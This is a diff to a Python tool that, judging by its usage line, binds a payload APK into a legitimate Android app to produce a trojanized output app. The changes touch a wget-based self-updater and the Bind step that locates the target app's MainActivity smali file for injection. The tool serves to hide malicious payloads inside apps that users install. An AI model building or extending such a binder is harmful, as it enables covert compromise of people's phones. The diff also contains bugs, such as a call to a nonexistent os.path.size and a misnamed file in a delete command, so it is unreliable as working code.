@@ -31,25 +31,31 @@ def Update():
 	if os.name == 'nt':
 		pass # Will add for windows soon.
 	else:
-		print(YELLOW + 'Checking for updates...' + WHITE)
-		o = open('.ver','r')
-		oo = o.read()
-		o.close()
-		os.system(rm + ' .ver')
-		os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/.ver')
-		u = open('.ver','r').read()
-		if int(oo) == int(u):
-			print(YELLOW + 'No updates available' + WHITE)
-		else:
-			print(GREEN + "Update available. Updating...(DONT CLOSE!" + WHITE)
-			os.system(rm + ' termux-install.sh main.py README.md CONTRIBUTORS.mf')
-			os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/main.py')
-			os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/README.md')
-			os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/CONTRIBUTORS.md')
-			os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/termux-install.sh')
-			os.system('chmod +x *')
-			print(GREEN + "Update Finished" + WHITE)
+		os.system("which wget>>w.txt")
+		if os.path.size('w.txt') == 0:
+			print(RED + "wget is not installed, please install it" + WHITE)
+			os.system(rm + " w.txt")
 			exit()
+		else:
+			print(YELLOW + 'Checking for updates...' + WHITE)
+			o = open('.ver','r')
+			oo = o.read()
+			o.close()
+			os.system(rm + ' .ver')
+			os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/.ver')
+			u = open('.ver','r').read()
+			if int(oo) == int(u):
+				print(YELLOW + 'No updates available' + WHITE)
+			else:
+				print(GREEN + "Update available. Updating...(DONT CLOSE!" + WHITE)
+				os.system(rm + ' termux-install.sh main.py README.md CONTRIBUTORS.mf')
+				os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/main.py')
+				os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/README.md')
+				os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/CONTRIBUTORS.md')
+				os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/termux-install.sh')
+				os.system('chmod +x *')
+				print(GREEN + "Update Finished" + WHITE)
+				exit()
 def Usage():
 	print(YELLOW + 'python3 %s <payload.apk> <target.apk> <output.apk> \n' % (str(sys.argv[0])))
 	print('\n' + YELLOW + 'pass the ' + BLUE + "--update" + YELLOW + " parameter to update.\n" + WHITE)
@@ -220,8 +226,8 @@ def Bind():
 		smalitarget = SetA(findA("%s/AndroidManifest.xml" % (original.replace('.apk',''))))
 		smali_name = smalitarget.split('.')[len(smalitarget.split('.')) - 1]
 		smali_loc = smalitarget.replace('.','/')
-		if not os.path.isfile("%s/smali/%s.smali" % (original.replace('.apk',''),smali_loc)):
-			print (YELLOW + "\n\nIt looks like this app is somewhat protected. \nThe MainActivity smali file which is specified in the AndroidManifest.xml (%s) is not present.\n CANNOT CONTINUE. EXITING..." % (smali_loc) + WHITE )
+		if not os.path.isfile("%s/smali/%s.smali" % (original.replace('.apk',''),smali_loc)): # Will be fixed in the next update
+			print (YELLOW + "\n\nIt looks like this app is somewhat protected. \nThe MainActivity smali file which is specified in the AndroidManifest.xml (%s) is not present. This will be fixed in the next update\n CANNOT CONTINUE. EXITING..." % (smali_loc) + WHITE )
 			subprocess.call(rm + 'TempP')
 			exit()
 		else:
